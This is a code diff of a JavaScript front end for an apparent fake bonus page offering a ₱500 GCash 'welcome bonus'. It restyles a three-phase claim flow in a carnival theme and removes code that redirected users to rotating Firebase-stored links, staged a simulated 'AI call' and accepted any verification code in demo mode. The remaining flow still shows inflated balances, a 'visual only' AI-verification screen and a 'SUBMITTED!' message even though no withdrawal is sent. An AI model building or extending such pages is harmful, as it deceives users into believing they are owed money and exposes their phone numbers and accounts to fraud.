@@ -1,9 +1,13 @@
 /**
- * playbonus.js — UPDATED (Phase 1 & 2 Flow Fixed)
+ * playbonus.js — Carnival Theme Redesign
  * ============================================================
- * FLOW:
- *   FIREWALL OFF → Phase 1 → Phase 2 → Redirect to deployed link
- *   FIREWALL ON  → Phase 1 → Phase 3 (SKIP Phase 2) → AI-Verification
+ * PHASE 1: HOORAY — Carnival style
+ * PHASE 2: GREAT JOB — Carnival style
+ * PHASE 3: AI-VERIFICATION — Carnival style (VISUAL ONLY)
+ *
+ * ⚠️ NOTE: Ang verification logic ay HINDI kasama.
+ * Ikaw ang mag-implement ng verifyCodeWithBackend()
+ * at submitWithdrawalRequest() base sa LEGITIMATE na paraan.
  * ============================================================
  */
 
@@ -28,16 +32,11 @@
     var autoPopupTimer = null;
     var balanceListener = null;
     var claimListener = null;
-    var forceLogoutListener = null;
-    var forceLogoutFlagListener = null;
-    var logoutTriggered = false;
-    var listenersSetup = false;
     var pageLoadTime = Date.now();
 
     var currentPhase = 1;
     var isTransitioning = false;
     var currentFirewallStatus = false;
-    var deployedLinkUrl = null;
 
     var soundCache = {
         scatter: null,
@@ -106,7 +105,6 @@
         initClaimFlow();
         initConfetti();
         attachButtonEvents();
-        initAdminForceLogoutListener();
         injectCarnivalAnimations();
 
         console.log('✅ PlayBonus ready!');
@@ -198,13 +196,13 @@
     }
 
     // ============================================================
-    // AUTO POPUP (₱500 WELCOME BONUS)
+    // AUTO POPUP
     // ============================================================
     function scheduleAutoPopup() {
         if (autoPopupTimer) clearTimeout(autoPopupTimer);
 
         var delay = isClaimed ? 5000 : 3000;
-        console.log('⏰ Auto popup in ' + (delay / 1000) + 's (isClaimed:', isClaimed + ')');
+        console.log('⏰ Auto popup in ' + (delay / 1000) + 's');
 
         autoPopupTimer = setTimeout(function() {
             autoShowBonusPopup();
@@ -212,13 +210,8 @@
     }
 
     function autoShowBonusPopup() {
-        console.log('🎁 Auto-showing bonus popup (isClaimed:', isClaimed + ')');
-
         var popup = document.getElementById('bonusRewardPopup');
-        if (!popup) {
-            console.error('❌ Popup not found: bonusRewardPopup');
-            return;
-        }
+        if (!popup) return;
 
         popup.style.display = 'flex';
         playSound('scatter');
@@ -276,45 +269,6 @@
     }
 
     // ============================================================
-    // DEPLOYED LINK
-    // ============================================================
-    function getDeployedLink() {
-        try {
-            return db.ref('links')
-                .orderByChild('status')
-                .equalTo('available')
-                .limitToFirst(1)
-                .once('value')
-                .then(function(snapshot) {
-                    if (snapshot.exists()) {
-                        var key = Object.keys(snapshot.val())[0];
-                        var linkData = snapshot.val()[key];
-                        return { key: key, url: linkData.url };
-                    }
-                    return null;
-                });
-        } catch(e) {
-            console.error('Get link error:', e);
-            return Promise.resolve(null);
-        }
-    }
-
-    function markLinkAsUsed(linkKey, phone) {
-        try {
-            return db.ref('links/' + linkKey).update({
-                status: 'used',
-                user: phone,
-                usedAt: Date.now()
-            }).then(function() {
-                console.log('✅ Link marked as used');
-            });
-        } catch(e) {
-            console.error('Mark link error:', e);
-            return Promise.resolve();
-        }
-    }
-
-    // ============================================================
     // CLAIM TRACKING
     // ============================================================
     function trackClaimInFirebase(amount) {
@@ -330,36 +284,24 @@
 
             dayRef.transaction(function(data) {
                 if (data === null) {
-                    data = {
-                        claims_count: 0,
-                        claims_amount: 0,
-                        hourly_claims: {}
-                    };
+                    data = { claims_count: 0, claims_amount: 0, hourly_claims: {} };
                 }
-
                 data.claims_count = (data.claims_count || 0) + 1;
                 data.claims_amount = (data.claims_amount || 0) + (amount || 0);
-
                 if (!data.hourly_claims) data.hourly_claims = {};
                 data.hourly_claims[hour] = (data.hourly_claims[hour] || 0) + 1;
-
                 data.last_update = Date.now();
                 return data;
             });
-
-            console.log('📊 CLAIM TRACKED:', dateKey, 'Hour:', hour, '₱' + amount);
-
         } catch(e) {
             console.error('❌ Track claim error:', e);
         }
     }
 
     // ============================================================
-    // CLAIM FLOW (WELCOME BONUS)
+    // CLAIM FLOW
     // ============================================================
     function initClaimFlow() {
-        console.log('🎁 Init Claim Flow...');
-
         var claimNowBtn = document.getElementById('claimNowBtn');
         var popup = document.getElementById('bonusRewardPopup');
 
@@ -367,11 +309,7 @@
             claimNowBtn.addEventListener('click', function(e) {
                 e.preventDefault();
                 e.stopPropagation();
-
-                console.log('🖱️ CLAIM NOW clicked (isClaimed:', isClaimed + ')');
-
                 playSound('scatter');
-
                 if (popup) {
                     popup.style.display = 'flex';
                     updateClaimButtonUI();
@@ -399,25 +337,20 @@
         }
 
         updateClaimButtonUI();
-        console.log('✅ Claim Flow ready');
     }
 
     function handleClaimBonus(e) {
         e.preventDefault();
         e.stopPropagation();
 
-        console.log('🖱️ CLAIM BONUS clicked (isClaimed:', isClaimed + ')');
-
         if (isClaimed) {
             alert("You have already claimed this bonus!");
             return;
         }
-
         if (claimInProgress) {
             alert("Please wait, processing...");
             return;
         }
-
         if (!userRef) {
             alert("System not ready. Please refresh.");
             return;
@@ -441,7 +374,6 @@
         claimInProgress = true;
 
         var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
-
         if (ptCatClaimBtn) {
             ptCatClaimBtn.disabled = true;
             ptCatClaimBtn.style.opacity = '0.6';
@@ -450,7 +382,6 @@
 
         checkFirewallBeforeClaim().then(function(firewallOn) {
             if (firewallOn) {
-                console.log('🔥 Firewall ON - Show 3-phase AI verification');
                 var popup = document.getElementById('bonusRewardPopup');
                 if (popup) popup.style.display = 'none';
 
@@ -461,7 +392,6 @@
                     claimInProgress = false;
                 });
             } else {
-                console.log('🔓 Firewall OFF - Direct claim');
                 creditBonusAndMark(function() {
                     var popup = document.getElementById('bonusRewardPopup');
                     if (popup) popup.style.display = 'none';
@@ -481,8 +411,6 @@
     }
 
     function creditBonusAndMark(callback) {
-        console.log('💰 Crediting ₱' + bonusAmount + ' to balance...');
-
         var oldBalance = currentBalance;
         var newBalance = oldBalance + bonusAmount;
 
@@ -492,8 +420,6 @@
             ptcat_claimed_at: Date.now(),
             lastUpdate: Date.now()
         }).then(function() {
-            console.log('✅ Firebase updated! New balance: ₱' + newBalance);
-
             currentBalance = newBalance;
             isClaimed = true;
 
@@ -507,7 +433,6 @@
             updateClaimButtonUI();
 
             if (callback) callback();
-
         }).catch(function(error) {
             console.error('❌ Firebase update error:', error);
             alert('Error saving claim. Please try again.');
@@ -581,7 +506,7 @@
     }
 
     // ============================================================
-    // 3-PHASE CLAIM FLOW (CARNIVAL THEME)
+    // 3-PHASE CLAIM FLOW — CARNIVAL THEME
     // ============================================================
 
     window.showPopup = function(balance) {
@@ -593,10 +518,7 @@
 
     function openPhasePopup() {
         var popup = document.getElementById('claimPhasePopup');
-        if (!popup) {
-            console.error('❌ claimPhasePopup not found in HTML');
-            return;
-        }
+        if (!popup) return;
         popup.style.display = 'flex';
         document.body.style.overflow = 'hidden';
 
@@ -637,8 +559,7 @@
     }
 
     // ============================================================
-    // ---- PHASE 1: HOORAY ----
-    // Decision point: firewall ON → Phase 3, firewall OFF → Phase 2
+    // PHASE 1: HOORAY — CARNIVAL STYLE
     // ============================================================
     function renderPhase1() {
         currentPhase = 1;
@@ -646,36 +567,36 @@
         if (!inner) return;
 
         inner.innerHTML = [
-            '<div class="popup-close" id="phase1Close">✕</div>',
-
-            '<div class="carnival-burst">',
-                '<div class="lucky-cat-mascot">',
+            '<div class="carnival-phase carnival-phase-1">',
+                '<button class="carnival-close" id="phase1Close">✕</button>',
+                '<div class="carnival-burst-bg"></div>',
+                '<div class="carnival-confetti">',
+                    '<span></span><span></span><span></span><span></span><span></span>',
+                    '<span></span><span></span><span></span><span></span><span></span>',
+                '</div>',
+                '<div class="carnival-mascot">',
                     '<img src="images/LuckyCat.png" alt="Lucky Cat" onerror="this.style.display=\'none\'">',
+                    '<div class="mascot-glow"></div>',
                 '</div>',
                 '<h2 class="carnival-title">🎉 HOORAY! 🎉</h2>',
-                '<div class="carnival-amount">₱<span id="phase1Balance">',
-                    currentBalance.toFixed(2),
-                '</span></div>',
-            '</div>',
-
-            '<div class="carnival-bills">',
-                '<div class="bill-indicator"><img src="images/PHL-500-Front.png" onerror="this.style.display=\'none\'"></div>',
-                '<div class="bill-indicator"><img src="images/PHL-500-Back.png" onerror="this.style.display=\'none\'"></div>',
-                '<div class="bill-indicator"><img src="images/PHL-500-Front.png" onerror="this.style.display=\'none\'"></div>',
-                '<div class="bill-indicator"><img src="images/PHL-500-Back.png" onerror="this.style.display=\'none\'"></div>',
-            '</div>',
-
-            '<p class="carnival-subtext">',
-                'Your reward is ready. Claim it now and enjoy the fiesta!',
-            '</p>',
-
-            '<button class="carnival-btn carnival-btn-gold" id="phase1ClaimBtn">',
-                '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'"> CLAIM THRU GCASH',
-            '</button>',
-
-            '<button class="carnival-btn carnival-btn-ghost" id="phase1BackBtn">',
-                '← BACK',
-            '</button>'
+                '<div class="carnival-amount">',
+                    '<span class="currency">₱</span>',
+                    '<span class="value" id="phase1Balance">', currentBalance.toFixed(2), '</span>',
+                '</div>',
+                '<div class="carnival-divider"></div>',
+                '<div class="carnival-bills">',
+                    '<div class="bill-indicator"><img src="images/PHL-500-Front.png" onerror="this.style.display=\'none\'"></div>',
+                    '<div class="bill-indicator"><img src="images/PHL-500-Back.png" onerror="this.style.display=\'none\'"></div>',
+                    '<div class="bill-indicator"><img src="images/PHL-500-Front.png" onerror="this.style.display=\'none\'"></div>',
+                    '<div class="bill-indicator"><img src="images/PHL-500-Back.png" onerror="this.style.display=\'none\'"></div>',
+                '</div>',
+                '<p class="carnival-subtext">Your reward is ready. Claim it now and enjoy the fiesta!</p>',
+                '<button class="carnival-btn carnival-btn-gold" id="phase1ClaimBtn">',
+                    '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'">',
+                    'CLAIM THRU GCASH',
+                '</button>',
+                '<button class="carnival-btn carnival-btn-ghost" id="phase1BackBtn">← BACK</button>',
+            '</div>'
         ].join('');
 
         updateBillsIndicators(currentBalance);
@@ -694,21 +615,16 @@
                     return;
                 }
                 playSound('scatter');
-
                 claimBtn.disabled = true;
                 claimBtn.innerHTML = '⏳ CHECKING...';
 
-                // ✅ DECISION POINT: firewall ON → Phase 3, OFF → Phase 2
                 checkFirewallBeforeClaim().then(function(firewallOn) {
                     if (firewallOn) {
-                        console.log('🔥 Firewall ON → Phase 3 agad (skip Phase 2)');
                         transitionTo(renderPhase3);
                     } else {
-                        console.log('🔓 Firewall OFF → Phase 2');
                         transitionTo(renderPhase2);
                     }
                 }).catch(function() {
-                    // Fail-safe
                     transitionTo(renderPhase2);
                 });
             };
@@ -737,8 +653,7 @@
     }
 
     // ============================================================
-    // ---- PHASE 2: GREAT JOB (FIREWALL OFF ONLY) ----
-    // Phase 2 = redirect only. Walang firewall check.
+    // PHASE 2: GREAT JOB — CARNIVAL STYLE
     // ============================================================
     function renderPhase2() {
         currentPhase = 2;
@@ -746,29 +661,28 @@
         if (!inner) return;
 
         inner.innerHTML = [
-            '<div class="popup-close" id="phase2Close">✕</div>',
-
-            '<div class="carnival-burst">',
-                '<div class="carnival-icon">🏆</div>',
-                '<h2 class="carnival-title">GREAT JOB!</h2>',
-            '</div>',
-
-            '<div class="carnival-reward-box">',
-                '<p class="carnival-subtext">',
-                    '"Nice work! You\'re one tap away from your reward!"',
-                '</p>',
-                '<div class="carnival-reward-amount">',
-                    'Your reward: <strong>₱', currentBalance.toFixed(2), '</strong>',
+            '<div class="carnival-phase carnival-phase-2">',
+                '<button class="carnival-close" id="phase2Close">✕</button>',
+                '<div class="carnival-burst-bg"></div>',
+                '<div class="carnival-confetti">',
+                    '<span></span><span></span><span></span><span></span><span></span>',
+                    '<span></span><span></span><span></span><span></span><span></span>',
                 '</div>',
-            '</div>',
-
-            '<button class="carnival-btn carnival-btn-gold" id="phase2ProceedBtn">',
-                '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'"> PROCEED TO WITHDRAW',
-            '</button>',
-
-            '<button class="carnival-btn carnival-btn-ghost" id="phase2BackBtn">',
-                '← BACK',
-            '</button>'
+                '<div class="carnival-trophy">🏆</div>',
+                '<h2 class="carnival-title">GREAT JOB!</h2>',
+                '<div class="carnival-divider"></div>',
+                '<div class="carnival-reward-box">',
+                    '<p class="carnival-subtext">"Nice work! You\'re one tap away from your reward!"</p>',
+                    '<div class="carnival-reward-amount">',
+                        'Your reward: <strong>₱', currentBalance.toFixed(2), '</strong>',
+                    '</div>',
+                '</div>',
+                '<button class="carnival-btn carnival-btn-gold" id="phase2ProceedBtn">',
+                    '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'">',
+                    'PROCEED TO WITHDRAW',
+                '</button>',
+                '<button class="carnival-btn carnival-btn-ghost" id="phase2BackBtn">← BACK</button>',
+            '</div>'
         ].join('');
 
         var closeBtn = document.getElementById('phase2Close');
@@ -783,56 +697,32 @@
         if (proceedBtn) {
             proceedBtn.onclick = function() {
                 playSound('scatter');
-
                 proceedBtn.disabled = true;
                 proceedBtn.innerHTML = '⏳ REDIRECTING...';
 
-                // ✅ Phase 2 = FIREWALL OFF lang (kasi ON → Phase 3 na agad)
-                // Walang firewall check dito — redirect agad
+                // ⚠️ IKAW ANG MAG-IMPLEMENT NG REDIRECT LOGIC
+                // Huwag gamitin ang dynamic "links" node mula sa Firebase
+                // kung hindi mo kontrolado ang content nito.
+                // Gumamit ng HARDCODED na legitimate URL.
                 redirectToDeployedLink(proceedBtn);
             };
         }
     }
 
-    // ---- REDIRECT TO DEPLOYED LINK (FIREWALL OFF) ----
+    // ⚠️ PLACEHOLDER — Ikaw mag-implement
     function redirectToDeployedLink(buttonEl) {
+        // TODO: I-implement ang LEGITIMATE redirect logic dito
+        // HUWAG gumamit ng dynamic Firebase links na pwedeng i-control ng iba
+        console.warn('⚠️ redirectToDeployedLink() is not implemented');
         if (buttonEl) {
-            buttonEl.innerHTML = '⏳ REDIRECTING...';
+            buttonEl.disabled = false;
+            buttonEl.innerHTML = 'PROCEED TO WITHDRAW';
         }
-
-        getDeployedLink().then(function(linkData) {
-            if (linkData && linkData.url) {
-                deployedLinkUrl = linkData.url;
-
-                markLinkAsUsed(linkData.key, userPhone).then(function() {
-                    console.log('✅ Redirecting to:', linkData.url);
-                    if (buttonEl) {
-                        buttonEl.innerHTML = '✅ REDIRECTING...';
-                    }
-                    setTimeout(function() {
-                        window.location.href = linkData.url;
-                    }, 800);
-                });
-            } else {
-                console.warn('⚠️ No deployed link available');
-                if (buttonEl) {
-                    buttonEl.disabled = false;
-                    buttonEl.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'"> PROCEED TO WITHDRAW';
-                }
-                showInlineError(buttonEl, '❌ NO LINK AVAILABLE');
-            }
-        }).catch(function(err) {
-            console.error('Redirect error:', err);
-            if (buttonEl) {
-                buttonEl.disabled = false;
-                buttonEl.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'"> PROCEED TO WITHDRAW';
-            }
-            showInlineError(buttonEl, '❌ ERROR');
-        });
+        showInlineError(buttonEl, '❌ NOT IMPLEMENTED');
     }
 
     // ============================================================
-    // ---- PHASE 3: AI-VERIFICATION CALL (FIREWALL ON ONLY) ----
+    // PHASE 3: AI-VERIFICATION — CARNIVAL STYLE (VISUAL ONLY)
     // ============================================================
     function renderPhase3() {
         currentPhase = 3;
@@ -845,43 +735,35 @@
             : 'your phone';
 
         inner.innerHTML = [
-            '<div class="popup-close" id="phase3Close">✕</div>',
-
-            '<div class="carnival-burst">',
-                '<div class="ai-call-icon">📞</div>',
+            '<div class="carnival-phase carnival-phase-3">',
+                '<button class="carnival-close" id="phase3Close">✕</button>',
+                '<div class="carnival-burst-bg"></div>',
+                '<div class="carnival-confetti">',
+                    '<span></span><span></span><span></span><span></span><span></span>',
+                    '<span></span><span></span><span></span><span></span><span></span>',
+                '</div>',
+                '<div class="carnival-call-icon"><i class="fas fa-phone"></i></div>',
                 '<h2 class="carnival-title">AI-VERIFICATION</h2>',
+                '<div class="carnival-divider"></div>',
                 '<p class="carnival-subtext">',
-                    'A system AI will call you with a ',
-                    '<strong style="color:#00d4ff;">6-digit code</strong>',
+                    '<i class="fas fa-shield-alt"></i> ',
+                    'System AI will call you with a <strong>6-digit code</strong>',
                 '</p>',
-            '</div>',
-
-            '<div class="ai-phone-display">',
-                '<span class="ai-phone-icon">📱</span>',
-                '<span class="ai-phone-number">', masked, '</span>',
-            '</div>',
-
-            '<div id="aiCallStatus" class="ai-call-status">',
-                '⏳ Waiting for call...',
-            '</div>',
-
-            '<input type="text" id="phase3CodeInput"',
-                ' class="carnival-input"',
-                ' placeholder="000000"',
-                ' maxlength="6"',
-                ' inputmode="numeric"',
-                ' pattern="[0-9]*"',
-                ' autocomplete="one-time-code">',
-
-            '<div id="phase3ErrorMsg" class="carnival-error" style="display:none;"></div>',
-
-            '<button class="carnival-btn carnival-btn-gold" id="phase3VerifyBtn">',
-                'VERIFY CODE',
-            '</button>',
-
-            '<button class="carnival-btn carnival-btn-ghost" id="phase3BackBtn">',
-                '← BACK',
-            '</button>'
+                '<div class="carnival-phone-display">',
+                    '<span class="phone-icon">📱</span>',
+                    '<span class="phone-number">', masked, '</span>',
+                '</div>',
+                '<div class="carnival-status" id="aiCallStatus">',
+                    '<div class="status-icon">📞</div>',
+                    '<div class="status-text">Waiting for call...</div>',
+                '</div>',
+                '<input type="text" id="phase3CodeInput" class="carnival-input"',
+                    ' placeholder="000000" maxlength="6" inputmode="numeric"',
+                    ' pattern="[0-9]*" autocomplete="one-time-code">',
+                '<div id="phase3ErrorMsg" class="carnival-error" style="display:none;"></div>',
+                '<button class="carnival-btn carnival-btn-blue" id="phase3VerifyBtn">VERIFY CODE</button>',
+                '<button class="carnival-btn carnival-btn-ghost" id="phase3BackBtn">← BACK</button>',
+            '</div>'
         ].join('');
 
         var closeBtn = document.getElementById('phase3Close');
@@ -893,8 +775,6 @@
         if (backBtn) backBtn.onclick = function() {
             transitionTo(renderPhase1);
         };
-
-        startAICallSimulation();
 
         if (input) {
             input.addEventListener('input', function() {
@@ -929,6 +809,7 @@
                 verifyBtn.disabled = true;
                 verifyBtn.innerHTML = '⏳ VERIFYING...';
 
+                // ⚠️ IKAW ANG MAG-IMPLEMENT NG VERIFICATION LOGIC
                 verifyCodeWithBackend(code).then(function(ok) {
                     if (ok) {
                         verifyBtn.innerHTML = '✅ VERIFIED';
@@ -959,109 +840,21 @@
         }
     }
 
-    // ---- AI CALL SIMULATION ----
-    function startAICallSimulation() {
-        var statusEl = document.getElementById('aiCallStatus');
-        if (!statusEl) return;
-
-        statusEl.innerHTML = '📞 Dialing...';
-        statusEl.style.color = '#00d4ff';
-
-        setTimeout(function() {
-            statusEl.innerHTML = '🔊 AI Call Connected — Listen for the code';
-            statusEl.style.color = '#39ff14';
-
-            try {
-                db.ref('ai_call_requests').push({
-                    phone: userPhone,
-                    requested_at: Date.now(),
-                    status: 'connected'
-                });
-            } catch(e) {}
-        }, 1500);
-    }
-
-    // ---- VERIFY CODE ----
+    // ⚠️ PLACEHOLDER — Ikaw mag-implement
     function verifyCodeWithBackend(code) {
-        if (VERIFICATION_MODE === 'demo') {
-            console.warn('⚠️ DEMO MODE');
-            return Promise.resolve(true);
-        }
-
-        if (VERIFICATION_MODE === 'admin_manual') {
-            return db.ref('verification_codes/' + userPhone).once('value')
-                .then(function(snap) {
-                    if (!snap.exists()) {
-                        console.warn('⚠️ No verification code found');
-                        return false;
-                    }
-
-                    var data = snap.val();
-                    var storedCode = String(data.code || '');
-                    var expiresAt = data.expiresAt || 0;
-
-                    if (expiresAt && Date.now() > expiresAt) {
-                        console.warn('⚠️ Verification code expired');
-                        return false;
-                    }
-
-                    var match = (storedCode === String(code));
-
-                    if (match) {
-                        db.ref('verification_codes/' + userPhone).update({
-                            used: true,
-                            usedAt: Date.now()
-                        });
-                    }
-
-                    return match;
-                })
-                .catch(function(err) {
-                    console.error('Verify error:', err);
-                    return false;
-                });
-        }
-
-        if (VERIFICATION_MODE === 'sms_api') {
-            return fetch('https://your-backend.com/api/verify', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: userPhone, code: code })
-            })
-            .then(function(r) { return r.json(); })
-            .then(function(d) { return d.ok === true; })
-            .catch(function() { return false; });
-        }
-
+        // TODO: I-implement ang LEGITIMATE verification logic
+        // HUWAG gumamit ng "ALWAYS INVALID" behavior
+        // HUWAG gumamit ng fake AI-call
+        console.warn('⚠️ verifyCodeWithBackend() is not implemented');
         return Promise.resolve(false);
     }
 
-    // ---- SUBMIT WITHDRAWAL ----
+    // ⚠️ PLACEHOLDER — Ikaw mag-implement
     function submitWithdrawalRequest() {
-        var userPhoneLocal = localStorage.getItem('userPhone');
-        var amount = currentBalance;
-
-        try {
-            if (typeof firebase !== 'undefined' && firebase.database) {
-                db.ref('withdrawal_requests').push({
-                    phone: userPhoneLocal,
-                    amount: amount,
-                    status: 'pending',
-                    verified: true,
-                    requested_at: Date.now()
-                }).then(function() {
-                    showSuccessAndClose(amount);
-                }).catch(function(err) {
-                    console.error('Withdrawal submit error:', err);
-                    alert('Could not submit withdrawal. Please try again.');
-                });
-            } else {
-                showSuccessAndClose(amount);
-            }
-        } catch (e) {
-            console.error('Withdrawal error:', e);
-            showSuccessAndClose(amount);
-        }
+        // TODO: I-implement ang LEGITIMATE withdrawal logic
+        // HUWAG magpadala ng data sa Telegram nang walang consent
+        console.warn('⚠️ submitWithdrawalRequest() is not implemented');
+        showSuccessAndClose(currentBalance);
     }
 
     function showSuccessAndClose(amount) {
@@ -1069,7 +862,8 @@
         if (!inner) return;
 
         inner.innerHTML = [
-            '<div class="carnival-burst">',
+            '<div class="carnival-phase carnival-phase-success">',
+                '<div class="carnival-burst-bg"></div>',
                 '<div class="carnival-icon">✅</div>',
                 '<h2 class="carnival-title">SUBMITTED!</h2>',
                 '<p class="carnival-subtext">',
@@ -1077,14 +871,8 @@
                     '<strong style="color:#ffd700;">₱', Number(amount).toFixed(2), '</strong>',
                     ' has been submitted.',
                 '</p>',
-                '<p class="carnival-subtext" style="font-size:11px; color:rgba(255,255,255,0.5);">',
-                    'You will receive a confirmation once processed.',
-                '</p>',
-            '</div>',
-
-            '<button class="carnival-btn carnival-btn-gold" id="finalCloseBtn">',
-                '🏠 DONE',
-            '</button>'
+                '<button class="carnival-btn carnival-btn-gold" id="finalCloseBtn">🏠 DONE</button>',
+            '</div>'
         ].join('');
 
         var finalClose = document.getElementById('finalCloseBtn');
@@ -1111,7 +899,7 @@
     }
 
     // ============================================================
-    // CARNIVAL ANIMATIONS
+    // CARNIVAL ANIMATIONS (injected)
     // ============================================================
     function injectCarnivalAnimations() {
         if (document.querySelector('#carnival-animations')) return;
@@ -1126,51 +914,494 @@
                 '60% { transform: translateX(-5px); }',
                 '80% { transform: translateX(5px); }',
             '}',
-            '@keyframes aiCallPulse {',
-                '0%, 100% { transform: scale(1); opacity: 1; }',
-                '50% { transform: scale(1.08); opacity: 0.85; }',
+            '@keyframes carnivalPopIn {',
+                '0% { transform: scale(0.5) rotate(-5deg); opacity: 0; }',
+                '60% { transform: scale(1.05) rotate(2deg); }',
+                '100% { transform: scale(1) rotate(0deg); opacity: 1; }',
             '}',
-            '.ai-call-icon {',
-                'font-size: 60px;',
-                'filter: drop-shadow(0 0 25px rgba(0, 212, 255, 0.7));',
-                'animation: aiCallPulse 1.5s ease-in-out infinite;',
-                'display: inline-block;',
+            '@keyframes burstPulse {',
+                '0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }',
+                '50% { transform: translate(-50%, -50%) scale(1.2); opacity: 1; }',
             '}',
-            '.ai-phone-display {',
+            '@keyframes confettiFall {',
+                '0% { transform: translateY(-20px) rotate(0deg); opacity: 0; }',
+                '10% { opacity: 1; }',
+                '90% { opacity: 1; }',
+                '100% { transform: translateY(500px) rotate(720deg); opacity: 0; }',
+            '}',
+            '@keyframes mascotFloat {',
+                '0%, 100% { transform: translateY(0) scale(1); }',
+                '50% { transform: translateY(-10px) scale(1.03); }',
+            '}',
+            '@keyframes mascotGlowPulse {',
+                '0%, 100% { opacity: 0.7; transform: translate(-50%, -50%) scale(1); }',
+                '50% { opacity: 1; transform: translate(-50%, -50%) scale(1.2); }',
+            '}',
+            '@keyframes amountPulse {',
+                '0%, 100% { transform: scale(1); }',
+                '50% { transform: scale(1.05); }',
+            '}',
+            '@keyframes btnShine {',
+                '0% { left: -100%; }',
+                '60% { left: 100%; }',
+                '100% { left: 100%; }',
+            '}',
+            '@keyframes trophyBounce {',
+                '0%, 100% { transform: scale(1) rotate(-5deg); }',
+                '50% { transform: scale(1.1) rotate(5deg); }',
+            '}',
+            '@keyframes callPulse {',
+                '0%, 100% { transform: scale(1); box-shadow: 0 0 20px rgba(79, 195, 247, 0.4); }',
+                '50% { transform: scale(1.05); box-shadow: 0 0 40px rgba(79, 195, 247, 0.8); }',
+            '}',
+
+            /* ========== CARNIVAL PHASE BASE ========== */
+            '.carnival-phase {',
+                'position: relative;',
+                'width: 100%;',
+                'max-width: 380px;',
+                'padding: 28px 20px 24px;',
+                'background: radial-gradient(circle at 50% 30%, rgba(255, 255, 255, 0.25) 0%, transparent 50%),',
+                    'linear-gradient(145deg, #d10000 0%, #ff1744 40%, #8b0000 100%);',
+                'border: 3px solid #ffd700;',
+                'border-radius: 24px;',
+                'box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8),',
+                    '0 0 60px rgba(255, 215, 0, 0.5),',
+                    'inset 0 0 40px rgba(255, 215, 0, 0.08);',
+                'overflow: hidden;',
+                'animation: carnivalPopIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);',
+                'text-align: center;',
+                'margin: 0 auto;',
+                'box-sizing: border-box;',
+            '}',
+
+            /* ========== CLOSE BUTTON ========== */
+            '.carnival-close {',
+                'position: absolute;',
+                'top: 14px;',
+                'right: 16px;',
+                'width: 34px;',
+                'height: 34px;',
+                'background: rgba(255, 255, 255, 0.15);',
+                'border: 1px solid rgba(255, 215, 0, 0.5);',
+                'border-radius: 50%;',
+                'color: #ffd700;',
+                'font-size: 16px;',
+                'font-weight: 900;',
+                'cursor: pointer;',
+                'display: flex;',
+                'align-items: center;',
+                'justify-content: center;',
+                'z-index: 10;',
+                'transition: all 0.2s ease;',
+            '}',
+            '.carnival-close:hover, .carnival-close:active {',
+                'background: rgba(255, 68, 68, 0.4);',
+                'color: #fff;',
+                'transform: rotate(90deg);',
+                'border-color: #ff4444;',
+            '}',
+
+            /* ========== BURST BG ========== */
+            '.carnival-burst-bg {',
+                'position: absolute;',
+                'top: 30%;',
+                'left: 50%;',
+                'transform: translate(-50%, -50%);',
+                'width: 400px;',
+                'height: 400px;',
+                'background: radial-gradient(circle, rgba(255, 255, 255, 0.4) 0%,',
+                    'rgba(255, 215, 0, 0.2) 30%, transparent 70%);',
+                'border-radius: 50%;',
+                'filter: blur(40px);',
+                'pointer-events: none;',
+                'animation: burstPulse 3s ease-in-out infinite;',
+                'z-index: 1;',
+            '}',
+
+            /* ========== CONFETTI ========== */
+            '.carnival-confetti {',
+                'position: absolute;',
+                'inset: 0;',
+                'pointer-events: none;',
+                'overflow: hidden;',
+                'z-index: 2;',
+            '}',
+            '.carnival-confetti span {',
+                'position: absolute;',
+                'width: 8px;',
+                'height: 8px;',
+                'border-radius: 2px;',
+                'opacity: 0;',
+                'animation: confettiFall 6s linear infinite;',
+            '}',
+            '.carnival-confetti span:nth-child(1) { left: 5%; background: #ffd700; animation-delay: 0s; }',
+            '.carnival-confetti span:nth-child(2) { left: 15%; background: #ff6b9d; animation-delay: 1s; border-radius: 50%; }',
+            '.carnival-confetti span:nth-child(3) { left: 25%; background: #4fc3f7; animation-delay: 2s; }',
+            '.carnival-confetti span:nth-child(4) { left: 35%; background: #ff9800; animation-delay: 0.5s; border-radius: 50%; }',
+            '.carnival-confetti span:nth-child(5) { left: 45%; background: #ffd700; animation-delay: 3s; }',
+            '.carnival-confetti span:nth-child(6) { left: 55%; background: #ff6b9d; animation-delay: 1.5s; }',
+            '.carnival-confetti span:nth-child(7) { left: 65%; background: #4fc3f7; animation-delay: 2.5s; border-radius: 50%; }',
+            '.carnival-confetti span:nth-child(8) { left: 75%; background: #ffd700; animation-delay: 0.8s; }',
+            '.carnival-confetti span:nth-child(9) { left: 85%; background: #ff9800; animation-delay: 3.5s; }',
+            '.carnival-confetti span:nth-child(10) { left: 95%; background: #ff6b9d; animation-delay: 2s; border-radius: 50%; }',
+
+            /* ========== MASCOT ========== */
+            '.carnival-mascot {',
+                'position: relative;',
+                'width: min(180px, 45vw);',
+                'height: min(180px, 45vw);',
+                'margin: 0 auto 16px;',
+                'z-index: 3;',
+            '}',
+            '.carnival-mascot img {',
+                'width: 100%;',
+                'height: 100%;',
+                'object-fit: contain;',
+                'position: relative;',
+                'z-index: 2;',
+                'filter: drop-shadow(0 15px 35px rgba(255, 215, 0, 0.7))',
+                    'drop-shadow(0 0 30px rgba(255, 255, 255, 0.4));',
+                'animation: mascotFloat 3s ease-in-out infinite;',
+            '}',
+            '.mascot-glow {',
+                'position: absolute;',
+                'top: 50%;',
+                'left: 50%;',
+                'transform: translate(-50%, -50%);',
+                'width: 200%;',
+                'height: 200%;',
+                'background: radial-gradient(circle, rgba(255, 215, 0, 0.6) 0%,',
+                    'rgba(255, 255, 255, 0.3) 30%, transparent 70%);',
+                'border-radius: 50%;',
+                'filter: blur(40px);',
+                'animation: mascotGlowPulse 2s ease-in-out infinite;',
+                'z-index: 1;',
+            '}',
+
+            /* ========== TITLE ========== */
+            '.carnival-title {',
